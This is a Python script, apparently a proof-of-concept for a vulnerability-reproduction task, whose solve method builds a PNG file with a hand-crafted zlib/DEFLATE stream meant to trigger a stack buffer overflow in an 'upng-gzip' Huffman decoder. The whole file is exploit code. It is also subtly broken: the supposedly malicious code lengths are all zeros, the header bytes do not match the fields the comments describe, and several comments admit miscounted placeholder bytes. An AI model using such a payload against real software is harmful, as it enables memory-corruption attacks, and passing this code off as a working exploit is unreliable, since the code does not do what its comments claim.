import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PNG with IDAT chunk containing crafted zlib data
        # that triggers the stack buffer overflow in upng-gzip Huffman decoding
        
        # PNG signature
        png = bytearray(b'\x89PNG\r\n\x1a\n')
        
        # IHDR chunk (1x1 grayscale)
        ihdr = bytearray()
        ihdr.extend(struct.pack('>I', 13))  # Length
        ihdr.extend(b'IHDR')
        ihdr.extend(struct.pack('>IIBBBBB', 1, 1, 8, 0, 0, 0, 0))  # Width=1, Height=1
        ihdr.extend(struct.pack('>I', zlib.crc32(ihdr[4:])))
        png.extend(ihdr)
        
        # Craft malicious zlib data that will overflow the 15-byte buffer
        # by creating Huffman trees with lengths > 15
        # The zlib stream will have a malformed DEFLATE block
        
        # zlib header (CM=8, CINFO=7, FCHECK=0xDA)
        zlib_data = bytearray(b'\x78\xDA')
        
        # DEFLATE block header: BFINAL=1 (last block), BTYPE=10 (dynamic Huffman)
        zlib_data.extend(b'\x05')
        
        # HLIT = 0 (257 literal/length codes), HDIST = 0 (1 distance code)
        # HCLEN = 15 (19 code length codes)
        zlib_data.extend(b'\x00\x0F')
        
        # Code length codes: we need 19 codes (3 bits each = 57 bits)
        # We'll use code lengths that will cause buffer overflow
        # The temporary array is sized 15 but we write 19 code lengths
        code_lengths = [
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        ]
        
        # Pack 19 3-bit code lengths
        bits = 0
        bit_count = 0
        for i, cl in enumerate(code_lengths[:19]):
            bits |= (cl & 0x07) << bit_count
            bit_count += 3
            if bit_count >= 8:
                zlib_data.append(bits & 0xFF)
                bits >>= 8
                bit_count -= 8
        
        if bit_count > 0:
            zlib_data.append(bits & 0xFF)
        
        # Literal/length code lengths (288 codes)
        # We'll send a simple run-length encoded sequence
        # that overflows the temporary buffer
        # First, send code length 0 for all 288 codes using RLE
        # Code 18: repeat zero 11-138 times (we need 288 zeros)
        
        # Send 138 zeros (code 18 + 127 in 7 bits)
        zlib_data.extend(b'\x00\x00')  # Actually 2 bits for code 18 + 7 bits for count
        
        # Send remaining 150 zeros (138 + 150 = 288)
        # Code 18 + 139 in 7 bits (139-11=128, but max is 127)
        # So we do 138 + 138 + 12 = 288
        zlib_data.extend(b'\x00\x00')  # Another 138 zeros
        
        # Distance code lengths (32 codes, all zeros)
        # Code 18 + 21 in 7 bits (32-11=21)
        zlib_data.extend(b'\x00')
        
        # End of block code (256)
        zlib_data.extend(b'\x00')
        
        # Adler-32 checksum (for empty data)
        zlib_data.extend(struct.pack('>I', 1))
        
        # IDAT chunk with our malicious zlib data
        idat = bytearray()
        idat.extend(struct.pack('>I', len(zlib_data)))  # Length
        idat.extend(b'IDAT')
        idat.extend(zlib_data)
        idat.extend(struct.pack('>I', zlib.crc32(idat[4:])))
        png.extend(idat)
        
        # IEND chunk
        iend = bytearray()
        iend.extend(struct.pack('>I', 0))
        iend.extend(b'IEND')
        iend.extend(struct.pack('>I', zlib.crc32(iend[4:])))
        png.extend(iend)
        
        return bytes(png)